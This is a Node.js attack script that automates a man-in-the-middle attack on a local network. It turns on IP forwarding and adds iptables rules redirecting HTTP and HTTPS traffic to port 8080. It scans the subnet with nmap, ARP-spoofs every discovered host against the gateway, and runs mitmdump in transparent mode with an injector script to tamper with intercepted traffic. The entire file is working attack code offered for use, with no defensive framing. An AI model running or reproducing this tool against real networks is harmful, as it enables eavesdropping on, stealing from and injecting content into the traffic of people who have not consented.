var args = require('commander')
args.version('1.0')
  .option('-i, --interface [value]', 'Interface to preform the attack on')
  .option('-g, --gateway [value]', 'Network default gateway')
  .option('-a, --attacker-ip [value]', 'Your local ip adress (to avoid arp spoofing yourself')
  .option('-n, --network-mask [value]', 'The network mask to scan for targets')
  .parse(process.argv)

const express = require('express')

const execSync = require('child_process').execSync
const spawn = require('child_process').spawn

const exec = (args) => {
  args = args.split(' ')
  let command = args.shift()

  return spawn(command, args)
}

const attackInterface = args.interface || 'eth0'
const gateway = args.gateway || '192.168.1.1'
const attackerIp = args.attackerIp || '192.168.1.2'
const network = args.networkMask || '192.168.1.1/24'

execSync(`sysctl net.ipv4.ip_forward=1`)
execSync(`sysctl net.ipv4.conf.all.accept_redirects=1`)
execSync(`sysctl net.ipv4.conf.all.send_redirects=0`)
execSync(`iptables -t nat -A POSTROUTING -o ${attackInterface} -j MASQUERADE`)
execSync(`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`)
execSync(`iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080`)

console.log(`Scanning for targets... (running "nmap ${network} -n -sP")`)
let hosts = execSync(`nmap ${network} -n -sP | grep report | awk '{print $5}'`).toString().split('\n')
hosts.splice(0, 1)
hosts.splice(hosts.length - 1, 1)
console.log(`Discovered ${hosts.length} targets`)

for (let index = 0; index < hosts.length; index++) {
  const victim = hosts[index]
  if (victim === attackerIp) continue

  console.log(`Arp spoofing ${victim}`)
  let arpStream = exec(`arpspoof -c both -i ${attackInterface} -t ${victim} -r ${gateway}`)

  arpStream.on('close', (code) => {
    console.log(`Arp spoof process for ${victim} exited with code ${code}`)
  })
}

const mitmdump = exec(`mitmdump --mode transparent -s 'injector.py'`)

mitmdump.stdout.on('data', (data) => {
  console.log(`mitmdump: ${data}`.replace('\n', ''))
})

mitmdump.stderr.on('data', (data) => {
  console.log(`mitmdump: ${data}`.replace('\n', ''))
})

const app = express()

app.get('/*', function (req, res) {
  res.send('ok')
})

app.listen(80)
